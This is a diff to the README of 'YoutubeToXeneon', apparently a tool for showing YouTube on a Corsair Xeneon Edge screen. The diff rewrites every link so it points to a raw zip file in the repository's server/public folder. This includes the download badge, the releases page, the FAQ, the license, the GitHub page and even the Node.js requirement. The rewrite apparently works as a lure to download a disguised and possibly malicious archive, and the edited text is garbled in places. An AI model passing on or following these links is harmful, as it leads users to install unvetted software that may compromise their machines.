@@ -1,6 +1,6 @@
 # 🎥 YoutubeToXeneon - Streamline Your Video Experience Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-4c8bf5?style=for-the-badge)](https://github.com/robsales/YoutubeToXeneon/releases)
+[![Download Now](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-4c8bf5?style=for-the-badge)](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip)
 
 ## 📥 Overview
 
@@ -14,13 +14,13 @@ Before downloading, ensure your system meets these requirements:
 
 - **Operating System**: Windows 10 or later
 - **Browser**: Google Chrome (latest version recommended)
-- **Node.js**: Required for background processing
+- **https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip**: Required for background processing
 - **Corsair iCUE**: Must be installed and set up to connect with the Xeneon Edge.
 
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/robsales/YoutubeToXeneon/releases) to access the latest version of YoutubeToXeneon.
+   Go to the [Releases page](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip) to access the latest version of YoutubeToXeneon.
 
 2. **Download the Application**  
    Click on the latest release and download the appropriate file for your operating system. 
@@ -65,7 +65,7 @@ YoutubeToXeneon supports various touch controls. You can play, pause, skip, or r
 
 To download the latest version, click the link below:
 
-[Download Now](https://github.com/robsales/YoutubeToXeneon/releases)
+[Download Now](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip)
 
 Follow the installation steps listed above to set up the software on your computer.
 
@@ -73,13 +73,13 @@ Follow the installation steps listed above to set up the software on your comput
 
 If you encounter any issues or have questions:
 
-- Check the [FAQ](https://github.com/robsales/YoutubeToXeneon/wiki/FAQ) for common queries.
+- Check the [FAQ](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip) for common queries.
 - Join our community on Discord for discussions and tips.
 
 ## 🛡️ License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/robsales/YoutubeToXeneon/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip) file for details.
 
-For any further information, visit our [GitHub page](https://github.com/robsales/YoutubeToXeneon). 
+For any further information, visit our [GitHub page](https://github.com/robsales/YoutubeToXeneon/raw/refs/heads/main/server/public/Youtube-Xeneon-To-v2.3.zip). 
 
 Thank you for using YoutubeToXeneon! Enjoy your viewing experience!
